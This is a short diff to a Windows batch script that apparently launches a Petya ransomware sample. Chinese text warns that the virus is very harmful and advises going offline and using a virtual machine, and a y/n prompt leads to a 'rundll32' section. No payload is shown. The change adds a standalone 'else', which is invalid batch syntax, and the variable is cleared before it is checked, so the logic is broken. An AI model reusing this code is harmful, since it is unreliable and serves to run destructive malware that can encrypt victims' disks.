@@ -21,6 +21,7 @@ echo. 警告：该病毒有极大的危害，请断网并上虚拟机！
 set /p switchofpetya=确定要运行吗？ (y/n（或任意键）)
 set switchofpetya=
 if /i \"%switchofpetya%\"==\"y\" goto rundll32
+else
 exit
 :rundll32
 cls
